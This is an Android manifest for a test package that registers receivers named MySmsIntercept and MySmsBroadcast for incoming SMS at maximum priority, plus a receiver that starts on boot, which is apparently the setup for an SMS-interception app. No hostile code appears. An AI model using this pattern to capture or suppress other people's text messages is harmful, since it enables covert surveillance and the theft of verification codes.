<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.iweigame.test"
    android:versionCode="1"
    android:versionName="1.0" >

    <uses-sdk android:minSdkVersion="8" />

    <application
        android:icon="@drawable/ic_launcher"
        android:label="@string/app_name" >
        <activity
            android:label="@string/app_name"
            android:name=".MainActivity" >
            <intent-filter >
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        <!-- 注册一个开机完成广播接收者,设置他的优先级2147483647 -->	
       <receiver android:name=".MySmsIntercept" android:permission="android.permission.BROADCAST_SMS">
			 <intent-filter android:priority="2147483647" >
                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
             </intent-filter>
             <intent-filter android:priority="2147483647">
                <action android:name="android.intent.action.BOOT_COMPLETED" />
             </intent-filter>
	  </receiver>
	  <service android:name=".MySmsServices"></service>
	  
	 <receiver android:name=".MySmsBroadcast" android:permission="android.permission.BROADCAST_SMS">
	  <intent-filter android:priority="2147483647" >
                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
       </intent-filter>
	 </receiver>
    </application>
	<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"></uses-permission>
	<uses-permission android:name="android.permission.RECEIVE_SMS"></uses-permission>
</manifest>